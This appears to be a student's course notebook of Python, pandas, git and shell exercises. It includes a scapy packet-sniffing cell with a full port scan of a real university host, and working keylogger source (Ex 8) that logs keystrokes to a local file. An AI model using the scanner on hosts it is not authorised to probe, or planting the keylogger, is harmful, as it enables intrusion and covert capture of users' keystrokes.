# %%
# 1(Integer.)
a=12
b=17
c=a+b
print(c)
print(type(c))
# Out:
# 29
# <class 'int'>

# %%
#2 (Float.)
dt_dec=29.2323
print(type(dt_dec))
# Out:
# <class 'float'>

# %%
#3 (String)
a='Hai '
b='hello'
c=a+b
print(c.upper())
print(c.lower())
c.replace('hello','bye')
# Out:
# HAI HELLO
# hai hello
# 'Hai bye'

# %%
#4 (Type Casting)
m1=70
m2=80
m3=87
m4=85
m5=65
total=m1+m2+m3+m4+m5
average=total/5
print("Total marks:",total)
print("Average:",average)
int(average)
# Out:
# Total marks: 387
# Average: 77.4
# 77

# %%
#5 (List)
name=['name1','name2','name3','name4','name5']
gender=['male','male','female','male','female']
age=[24,30,22,29,30]
reg_no=[22,34,21,3,7]
nation=['true','false','true','true','false']
print(name,"\n",gender,"\n",age,"\n",reg_no,"\n",nation,)
name.append('name6',)
reg_no.extend([22,43,57])
del(reg_no[5])
con=name+gender
print("Length of the list\t\t:\t\t",len(age))
print("Element added in the list\t:\t",name)
print("Multiple elements added in list\t:\t",reg_no)
print("deleted element\t\t\t:\t",reg_no)
print("Concatenate the two lists\t:\t",con)
print("particular item in this list\t:\t",)
a='false'
if a in nation:
  print("\t\tOther countries people also here")
else:
  print("Same county")
# Out:
# ['name1', 'name2', 'name3', 'name4', 'name5']
#  ['male', 'male', 'female', 'male', 'female']
#  [24, 30, 22, 29, 30]
#  [22, 34, 21, 3, 7]
#  ['true', 'false', 'true', 'true', 'false']
# Length of the list		:		 5
# Element added in the list	:	 ['name1', 'name2', 'name3', 'name4', 'name5', 'name6']
# Multiple elements added in list	:	 [22, 34, 21, 3, 7, 43, 57]
# deleted element			:	 [22, 34, 21, 3, 7, 43, 57]
# Concatenate the two lists	:	 ['name1', 'name2', 'name3', 'name4', 'name5', 'name6', 'male', 'male', 'female', 'male', 'female']
# particular item in this list	:
# 		Other countries people also here

# %%
#6 (Tuples)
my_data=(7,'name','001',9.7,9.1)
print("tuples\t\t:\t",my_data)
print("\n1st element of the tuple\t\t:",my_data[0])
print("Last element of the tuple\t\t:",my_data[3])
print("1st two elements of the tuple\t\t:",my_data[0:2])
# Out:
# tuples		:	 (7, 'name', '001', 9.7, 9.1)
#
# 1st element of the tuple		: 7
# Last element of the tuple		: 9.7
# 1st two elements of the tuple		: (7, 'name')

# %%
#7 (Dictionary)
whats={
    'good morning':'gm','tommorow':'tmrw','today':'2day'
}
print(whats)
print(whats.keys())
print(whats['today'])
print(whats)
# Out:
# {'good morning': 'gm', 'tommorow': 'tmrw', 'today': '2day'}
# dict_keys(['good morning', 'tommorow', 'today'])
# 2day
# {'good morning': 'gm', 'tommorow': 'tmrw', 'today': '2day'}

# %%
#Ex:2
#Calculate the electricity bill
print("*********calculating EB bill*******")
type=int(input("\n select the residntial palce:\n1.household\n2.commercial\n"))     
if(type ==1):
  def house():
    print("EB Bill for your House:")
    
    unit=int(input("enter the units"))
    if(unit<=100):
        ui=unit*0.50
    elif unit>=101 and unit<201:
         ui=unit*0.75
    elif unit<201 and unit<301:
         ui=unit*1.20
    else:
         ui=unit*1.50
    print("total charges:",ui)
  house()  
if(type ==2):
     def com():
      print("EB Bill for your Commercial palce:")
   
      unit=int(input("enter the units"))
      if(unit<=100):
        ui=unit*0.50*2
      elif unit>=101 and unit<201:
          ui=unit*0.75*2
      elif unit<201 and unit<301:
            ui=unit*1.20*2
      else:
         ui=unit*1.50*2
      print("total charges:",ui)
     com()
# Out:
# *********calculating EB bill*******
#
#  select the residntial palce:
# 1.household
# 2.commercial
# 2
# EB Bill for your Commercial palce:
# enter the units777
# total charges: 2331.0

# %%
#Ex. 3: OOPS Concepts: Functions & Inheritance  
#(1)Quiz Using Functions: 
p=0
q1 = '1. What are the features of cyber security?\na) Compliance\nb) Defense against internal threats\nc) Threat Prevention\nd) All of the above'
ca1 = 'd'
ans1 = input(q1)
if ans1 == ca1:
  p += 2
else:
  p -=1
print("\n\nCurrent points is:",p)  
q2 = '\n2)What does cyber security protect?\na) Cyber security protects criminals\nb) Cyber security protects internet-connected systems\nc) Cyber security protects hackers\nd) None of the mentioned '
ca2 = 'a'
ans2 = input(q2) 
if ans2 == ca2:
  p +=2
else:
  p -= 1
print("\n\nCurrent points is:",p)  
q3 = '\n3) Who is the father of computer security?\na) August Kerckhoffs\nb) Bob Thomas\nc) Robert\nd) Charles'
ca3 = 'a'
ans3 = input(q3)
if ans3 == ca3:
  p +=2
else:
  p -= 1
print("\n\nCurrent points is:",p)  
q4 = '\n4) Which of the following is a type of cyber security?\na) Cloud Security\nb) Network Security\nc) Application Security\nd) All of the above'
ca4 = 'd'
ans4 = input(q4)
if ans4 == ca4:
  p +=2
else:
  p -=1
print("\n\nCurrent points is:",p)  
q5 = '\n5) What are the features of cyber security?\na) Compliance\nb) Defense against internal threats\nc) Threat Prevention\nd) All of the above '
ca5 = 'd'
ans5 = input(q5)
if ans5 == ca5:
  p +=2
else:
  p -=1
print("\n\n\n\t\tTotal points is:",p)
# Out:
# 1. What are the features of cyber security?
# a) Compliance
# b) Defense against internal threats
# c) Threat Prevention
# d) All of the abovea
#
#
# Current points is: -1
#
# 2)What does cyber security protect?
# a) Cyber security protects criminals
# b) Cyber security protects internet-connected systems
# c) Cyber security protects hackers
# d) None of the mentioned a
#
#
# Current points is: 1
#
# 3) Who is the father of computer security?
# a) August Kerckhoffs
# b) Bob Thomas
# c) Robert
# d) Charlesa
#
#
# Current points is: 3
#
# 4) Which of the following is a type of cyber security?
# a) Cloud Security
# b) Network Security
# c) Application Security
# d) All of the aboved
#
#
# Current points is: 5
#
# 5) What are the features of cyber security?
# a) Compliance
# b) Defense against internal threats
# c) Threat Prevention
# d) All of the above d
#
#
#
# 		Total points is: 7

# %%
#Ex. 3: OOPS Concepts: Functions & Inheritance  
#2 Calculate the Gross Salary and Net Salary  
sal=float(input("Enter the basic salary:"))
lo=int(input("EMI PENDING \n1.yes\t2.no"))
if(lo == 1):
   def yes():
     da=sal*20/100;
     hra=sal*10/100;
     pf=sal*12/100;
     ta=sal*7.50/100;  
     emi=sal*2/100;
     net=da+hra-pf+ta-emi;
     gross=da+hra+ta;
     print("\nBasics:\t\t\t=\t\t",sal)
     print("\nDA:\t\t\t=\t\t",da)
     print("\nHRA:\t\t\t=\t\t",hra)
     print("\nPF:\t\t\t=\t\t",pf)
     print("\nTA:\t\t\t=\t\t",ta)
     print("\nEMI:\t\t\t=\t\t",emi)
     print("\n\t\t\t\t-------------------------------------------")
     print("\nNET SALARY:\t\t=\t\t",net)
     print("\n\t\t\t\t-------------------------------------------")
     print("\nGROSS SALARY:\t\t=\t\t",gross)
     print("\nDectected amount for EMI:\t\t",emi )
   yes()
if(lo== 2):
     def no():
        da=sal*20/100;
        hra=sal*10/100;
        pf=sal*12/100;
        ta=sal*7.50/100;  
        emi=0;
        net=da+hra-pf+ta-emi;
        gross=da+hra+ta;
        print("\nBasics:\t\t\t=\t\t",sal)
        print("\nDA:\t\t\t=\t\t",da)
        print("\nHRA:\t\t\t=\t\t",hra)
        print("\nPF:\t\t\t=\t\t",pf)
        print("\nTA:\t\t\t=\t\t",ta)
        print("\nEMI:\t\t\t=\t\t",emi)
        print("\n\t\t\t\t-------------------------------------------")
        print("\nNET SALARY:\t\t=\t\t",net)
        print("\n\t\t\t\t-------------------------------------------")
        print("\nGROSS SALARY:\t\t=\t\t",gross)
        print("\nDectected amount for EMI:\t\t",emi )   
     no()
# Out:
# Enter the basic salary:50000
# EMI PENDING
# 1.yes	2.no1
#
# Basics:			=		 50000.0
#
# DA:			=		 10000.0
#
# HRA:			=		 5000.0
#
# PF:			=		 6000.0
#
# TA:			=		 3750.0
#
# EMI:			=		 1000.0
#
# 				-------------------------------------------
#
# NET SALARY:		=		 11750.0
#
# 				-------------------------------------------
#
# GROSS SALARY:		=		 18750.0
#
# Dectected amount for EMI:		 1000.0

# %%
#Ex 4: Data Manipulation Using Pandas 
import pandas as pd
df=pd.DataFrame({
 'NAME': ['stu1','stu2','stu3','stu4','stu5','stu6','stu7','stu8','stu9','stu10'],
 'FATHER NAME' : ['f1','f2','f3','f4','f5','f6','f7','f8','f9','f10'],
 'doy'  : [2001,2009,1978,2000,2006,1998,2005,2000,2001,1998],
})
df['age']=2022-df['doy']
df['FATHER AGE']=2*df['age']
print("#1Dataframe:\n",df)
t2=df.select_dtypes(include=['int'])
t3=df.loc[0:4,'FATHER NAME':'doy']
t4=df.iloc[0:3,0:3]
t5=df.groupby(['doy',"age"]).groups
t6=df['STUDENT STATUS']=df['age'].apply (lambda x:'MAJOR' if x>18 else 'MINOR')
t7=df.rename(columns = {'STUDENT STATUS':'STUDENT STATUS'}, inplace = True)
print("\n#2 Select columns with specific data types:\n",t2)
print("\n#3 Slicing the dataframe:\n",t3)
print("\n#4 Select specific values in the column\n",t4)
print("\n#5 Group by Age:\n",t5)
print("\n#6 Map with dataframe:\n",t6)
print("\n#7 Rename the column name:\n",df)
t8=df.drop(df.index[1:3], inplace=True)
df.drop(['doy'], axis=1,inplace=True )
print("\n#8 Drop columns & rows in the dataframe:\n",df)
print("\n#9 Write/Read as CSV file:\n",)
df.to_csv('df')
display(df)
# Out:
# #1Dataframe:
#      NAME FATHER NAME   doy  age  FATHER AGE
# 0   stu1          f1  2001   21          42
# 1   stu2          f2  2009   13          26
# 2   stu3          f3  1978   44          88
# 3   stu4          f4  2000   22          44
# 4   stu5          f5  2006   16          32
# 5   stu6          f6  1998   24          48
# 6   stu7          f7  2005   17          34
# 7   stu8          f8  2000   22          44
# 8   stu9          f9  2001   21          42
# 9  stu10         f10  1998   24          48
#
# #2 Select columns with specific data types:
#      doy  age  FATHER AGE
# 0  2001   21          42
# 1  2009   13          26
# 2  1978   44          88
# 3  2000   22          44
# 4  2006   16          32
# 5  1998   24          48
# 6  2005   17          34
# 7  2000   22          44
# 8  2001   21          42
# 9  1998   24          48
#
# #3 Slicing the dataframe:
#    FATHER NAME   doy
# 0          f1  2001
# 1          f2  2009
# 2          f3  1978
# 3          f4  2000
# 4          f5  2006
#
# #4 Select specific values in the column
#     NAME FATHER NAME   doy
# 0  stu1          f1  2001
# 1  stu2          f2  2009
# 2  stu3          f3  1978
#
# #5 Group by Age:
#  {(1978, 44): [2], (1998, 24): [5, 9], (2000, 22): [3, 7], (2001, 21): [0, 8], (2005, 17): [6], (2006, 16): [4], (2009, 13): [1]}
#
# #6 Map with dataframe:
#  0    MAJOR
# 1    MINOR
# 2    MAJOR
# 3    MAJOR
# 4    MINOR
# 5    MAJOR
# 6    MINOR
# 7    MAJOR
# 8    MAJOR
# 9    MAJOR
# Name: age, dtype: object
#
# #7 Rename the column name:
#      NAME FATHER NAME   doy  age  FATHER AGE STUDENT STATUS
# 0   stu1          f1  2001   21          42          MAJOR
# 1   stu2          f2  2009   13          26          MINOR
# 2   stu3          f3  1978   44          88          MAJOR
# 3   stu4          f4  2000   22          44          MAJOR
# 4   stu5          f5  2006   16          32          MINOR
# 5   stu6          f6  1998   24          48          MAJOR
# 6   stu7          f7  2005   17          34          MINOR
# 7   stu8          f8  2000   22          44          MAJOR
# 8   stu9          f9  2001   21          42          MAJOR
# 9  stu10         f10  1998   24          48          MAJOR
#
# #8 Drop columns & rows in the dataframe:
#      NAME FATHER NAME  age  FATHER AGE STUDENT STATUS
# 0   stu1          f1   21          42          MAJOR
# 3   stu4          f4   22          44          MAJOR
# 4   stu5          f5   16          32          MINOR
# 5   stu6          f6   24          48          MAJOR
# 6   stu7          f7   17          34          MINOR
# 7   stu8          f8   22          44          MAJOR
# 8   stu9          f9   21          42          MAJOR
# 9  stu10         f10   24          48          MAJOR
#
# #9 Write/Read as CSV file:
#     NAME FATHER NAME  age  FATHER AGE STUDENT STATUS
# 0   stu1          f1   21          42          MAJOR
# 3   stu4          f4   22          44          MAJOR
# 4   stu5          f5   16          32          MINOR
# 5   stu6          f6   24          48          MAJOR
# 6   stu7          f7   17          34          MINOR
# 7   stu8          f8   22          44          MAJOR
# 8   stu9          f9   21          42          MAJOR
# 9  stu10         f10   24          48          MAJOR

# %%
'''#Ex 5: GIT Configuration
echo "****Enter the username in github****"
read name
git config --global user.name "$name"
echo "****Enter the email id****"
read mail
git config --global user.email "$mail"
git config --global push.default matching
git config --global alies.co checkout
echo ""
git init
git add .
git add .
git add .
echo "***Enter the commit message"
read commit
git commit -m "$commit"
git branch -M main
echo "***Enter the link in the repository in github"
read lin
git remote add origin $lin
git push -u origin main
echo "****Check it in github****"

# %%
pip install feedsearch
# Out:
# Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/
# Collecting feedsearch
#   Downloading feedsearch-1.0.12-py35.py36.py37-none-any.whl (18 kB)
# Collecting feedparser
#   Downloading feedparser-6.0.10-py3-none-any.whl (81 kB)
#      |████████████████████████████████| 81 kB 6.0 MB/s
# Requirement already satisfied: click in /usr/local/lib/python3.7/dist-packages (from feedsearch) (7.1.2)
# Requirement already satisfied: beautifulsoup4 in /usr/local/lib/python3.7/dist-packages (from feedsearch) (4.6.3)
# Requirement already satisfied: Werkzeug in /usr/local/lib/python3.7/dist-packages (from feedsearch) (1.0.1)
# Requirement already satisfied: requests in /usr/local/lib/python3.7/dist-packages (from feedsearch) (2.23.0)
# Collecting sgmllib3k
#   Downloading sgmllib3k-1.0.0.tar.gz (5.8 kB)
# Requirement already satisfied: urllib3!=1.25.0,!=1.25.1,<1.26,>=1.21.1 in /usr/local/lib/python3.7/dist-packages (from requests->feedsearch) (1.24.3)
# Requirement already satisfied: idna<3,>=2.5 in /usr/local/lib/python3.7/dist-packages (from requests->feedsearch) (2.10)
# Requirement already satisfied: chardet<4,>=3.0.2 in /usr/local/lib/python3.7/dist-packages (from requests->feedsearch) (3.0.4)
# Requirement already satisfied: certifi>=2017.4.17 in /usr/local/lib/python3.7/dist-packages (from requests->feedsearch) (2022.9.24)
# Building wheels for collected packages: sgmllib3k
#   Building wheel for sgmllib3k (setup.py) ... done
#   Created wheel for sgmllib3k: filename=sgmllib3k-1.0.0-py3-none-any.whl size=6065 sha256=3a4242e02e4a885eb56cbf5be696473abc27737251c0fdfd21e591fffc105301
#   Stored in directory: /root/.cache/pip/wheels/73/ad/a4/0dff4a6ef231fc0dfa12ffbac2a36cebfdddfe059f50e019aa
# Successfully built sgmllib3k
# Installing collected packages: sgmllib3k, feedparser, feedsearch
# Successfully installed feedparser-6.0.10 feedsearch-1.0.12 sgmllib3k-1.0.0

# %%
#Ex 6: Modular Programming: Scrap news from Hacker News
from feedsearch import search
import feedparser
import matplotlib.pyplot as plt
import numpy as np
import pandas as pd
from wordcloud import WordCloud,STOPWORDS
import numpy as np
feeds = search('https://thehackernews.com/')
df = pd.DataFrame({})
urls = [f.url for f in feeds]
a=[]
b=[]
c=[]
d=[]

if len(urls) > 0:
  nfeed = feedparser.parse(urls[0])
  entries =nfeed["entries"]
  count=0
for detail in entries:
  x=detail["link"]
  a.append(x)
for detail in entries:
  y=detail["title"]
  b.append(y)
for detail in entries:
  z=detail["id"]
  c.append(z)
for detail in entries:
  q=detail["published"]
  d.append(q)
df=pd.DataFrame({'link':a[0:5],'title':b[0:5],'id':c[0:5],'published date':d[0:5]})
display(df)
#for barplot
f=df[['title']]
fig = plt.figure()
print("\n\t\t*******Barplot*******\n")
ax = fig.add_axes([0,0,2,2])
ax.bar(d[0:5],a[0:5])
plt.show()
#for wordcloud
print("\n\n\t\t\t")
wc=WordCloud(background_color="black",width=1000,height=500).generate(''.join (f['title'].tolist()))
plt.figure(figsize=(10,7))
plt.imshow(wc)
# Out:
#                                                 link  \
# 0  https://thehackernews.com/2022/11/new-earth-lo...
# 1  https://thehackernews.com/2022/11/over-15000-w...
# 2  https://thehackernews.com/2022/11/what-is-exte...
# 3  https://thehackernews.com/2022/11/new-kmsdbot-...
# 4  https://thehackernews.com/2022/11/worok-hacker...
#
#                                                title  \
# 0  New "Earth Longzhi" APT Targets Ukraine and As...
# 1  Over 15,000 WordPress Sites Compromised in Mal...
# 2              What is an External Penetration Test?
# 3  New KmsdBot Malware Hijacking Systems for Mini...
# 4  Worok Hackers Abuse Dropbox API to Exfiltrate ...
#
#                                                   id  \
# 0  tag:blogger.com,1999:blog-4802841478634147276....
# 1  tag:blogger.com,1999:blog-4802841478634147276....
# 2  tag:blogger.com,1999:blog-4802841478634147276....
# 3  tag:blogger.com,1999:blog-4802841478634147276....
# 4  tag:blogger.com,1999:blog-4802841478634147276....
#
#                     published date
# 0  Mon, 14 Nov 2022 18:33:00 +0530
# 1  Mon, 14 Nov 2022 16:15:00 +0530
# 2  Mon, 14 Nov 2022 16:00:00 +0530
# 3  Mon, 14 Nov 2022 12:44:00 +0530
# 4  Mon, 14 Nov 2022 11:35:00 +0530
# 		*******Barplot*******

# %%
pip install scapy
# Out:
# Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/
# Collecting scapy
#   Downloading scapy-2.4.5.tar.gz (1.1 MB)
#      |████████████████████████████████| 1.1 MB 5.2 MB/s
# Building wheels for collected packages: scapy
#   Building wheel for scapy (setup.py) ... done
#   Created wheel for scapy: filename=scapy-2.4.5-py2.py3-none-any.whl size=1261555 sha256=0dc745f436e91962761ba11c31993da703f284a77bfb5f94531813704d8940ec
#   Stored in directory: /root/.cache/pip/wheels/b9/6e/c0/0157e466a5e02d3ff28fc7587dff329b4a967a23b3f9b11385
# Successfully built scapy
# Installing collected packages: scapy
# Successfully installed scapy-2.4.5

# %%
#Ex 7: Banner Grabbing and Packet Sniffing Using Scapy:
import pyfiglet
import sys
import socket
import requests
from scapy.all import sniff
ascii_banner = pyfiglet.figlet_format("Banner Grabbing and Packet Sniffing Using Scapy")
print(ascii_banner)
print("\t\t\t\t\t\t\t By Wolver...\n\n")
cap=sniff(count=7)
cap.summary()
hname=input("Enter websitename:")
ip =socket.gethostbyname(hname)
print("\t\tHostname-->",hname,"\t\tip address-->",ip)
for port in range(1,65535):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
         
        # returns an error indicator
        result = s.connect_ex((ip,port))
        if result ==0:
            print("Port {} is open".format(port))
        s.close()
# Out:
#  ____                                 ____           _     _     _
# | __ )  __ _ _ __  _ __   ___ _ __   / ___|_ __ __ _| |__ | |__ (_)_ __   __ _
# |  _ \ / _` | '_ \| '_ \ / _ \ '__| | |  _| '__/ _` | '_ \| '_ \| | '_ \ / _` |
# | |_) | (_| | | | | | | |  __/ |    | |_| | | | (_| | |_) | |_) | | | | | (_| |
# |____/ \__,_|_| |_|_| |_|\___|_|     \____|_|  \__,_|_.__/|_.__/|_|_| |_|\__, |
#                                                                          |___/
#                  _   ____            _        _
#   __ _ _ __   __| | |  _ \ __ _  ___| | _____| |_
#  / _` | '_ \ / _` | | |_) / _` |/ __| |/ / _ \ __|
# | (_| | | | | (_| | |  __/ (_| | (__|   <  __/ |_
#  \__,_|_| |_|\__,_| |_|   \__,_|\___|_|\_\___|\__|
#
#  ____        _  __  __ _               _   _     _
# / ___| _ __ (_)/ _|/ _(_)_ __   __ _  | | | |___(_)_ __   __ _
# \___ \| '_ \| | |_| |_| | '_ \ / _` | | | | / __| | '_ \ / _` |
#  ___) | | | | |  _|  _| | | | | (_| | | |_| \__ \ | | | | (_| |
# |____/|_| |_|_|_| |_| |_|_| |_|\__, |  \___/|___/_|_| |_|\__, |
#                                |___/                     |___/
#  ____
# / ___|  ___ __ _ _ __  _   _
# \___ \ / __/ _` | '_ \| | | |
#  ___) | (_| (_| | |_) | |_| |
# |____/ \___\__,_| .__/ \__, |
#                 |_|    |___/
#
# 							 By Wolver...
#
#
# Ether / IP / TCP 172.28.0.1:35462 > 172.28.0.2:8080 PA / Raw
# Ether / IP / TCP 172.28.0.1:35462 > 172.28.0.2:8080 PA / Raw
# Ether / IP / TCP 172.28.0.2:8080 > 172.28.0.1:35462 A
# Ether / IP / TCP 172.28.0.2:8080 > 172.28.0.1:35462 PA / Raw
# Ether / IP / TCP 172.28.0.1:35462 > 172.28.0.2:8080 A
# Ether / IP / TCP 172.28.0.2:9000 > 172.28.0.3:48486 PA / Raw
# Ether / IP / TCP 172.28.0.3:48486 > 172.28.0.2:9000 A
# Enter websitename:b-u.ac.in
# 		Hostname--> b-u.ac.in 		ip address--> 14.139.186.178
# Port 80 is open

# %%
'''#Ex 8: Design a Keylogger
#8 Keylogger
from pynput.keyboard import Listener
def log_keystroke(key):
    key = str(key).replace("", "")
    if key == 'Key.space':
        key = '\n'
    if key == 'Key.shift_r':
        key = '\n'
    if key == "Key.enter":
        key = '\n'
    with open("C:/Users/TUF/Desktop/keylogger output.txt" , 'a') as f:
        f.write(key)
with Listener(on_press=log_keystroke) as l:
    l.join()
#Runned in Pycharm

# %%
'''#Ex 9: Perform Arithmetic and Logical operation using Shell Script.
#1 Arithmetic Operations
echo "enterfirst number"
read a
echo "enter second numer:"
read b
add=$((a + b))
sub=$((a - b))
mul=$((a * b))
div=$((a / b))
mod=$((a % b))
echo "1.Addition: $add"
echo "2.Subtraction: $sub"
echo "3.Multiplication: $mul"
echo "4.Division: $div"
echo "5.Modulus: $mod"
if [ $a == $b ]
then
   echo "$a is equal to $b"
fi

if [ $a != $b ]
then
   echo "$a is not equal to $b"
fi

# %%
'''#2 Logical Operations
echo "Enter Num1"
read num1
echo "Enter Num2"
read num2
echo "Enter Num3"
read num3

if [ $num1 -gt $num2 ] && [ $num1 -gt $num3 ]
then
    echo "$num1 is greater number"
elif [ $num2 -gt $num1 ] && [ $num2 -gt $num3 ]
then
    echo "$num2 is a greater number"
else
    echo "$num3 is a greater number"
fi

# %%
'''#Ex 10: Perform Conditional statements & Looping using Shell Script
#1 Conditional Statement
echo "enter the directory name"
read dir
if [ -d $dir ]
then
cd $dir
ls > f
exec < f
while read line
do
if [ -f $line ]
then
if [ -r $line -a -w $line -a -x $line ]
then
echo "$line has all permissions"
else
echo "files not having all permissions"
fi
fi done
fi

# %%
'''#2 Looping Statements 
echo "Enter a number"
read num

fact=1

while [ $num -gt 1 ]
do
  fact=$((fact * num))
  num=$((num - 1))
done

echo Factorial of given number is $fact
